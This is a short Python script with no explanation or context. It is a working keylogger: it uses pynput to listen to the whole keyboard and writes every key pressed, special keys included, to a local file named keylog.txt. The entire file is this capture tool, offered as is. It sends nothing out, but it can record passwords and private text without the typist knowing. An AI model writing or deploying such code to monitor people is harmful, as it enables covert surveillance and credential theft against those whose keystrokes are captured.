from pynput import keyboard

def on_press(key):
    with open("keylog.txt", "a") as log_file:
        try:
            log_file.write(f"{key.char}")
        except AttributeError:
            log_file.write(f" <{key}> ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
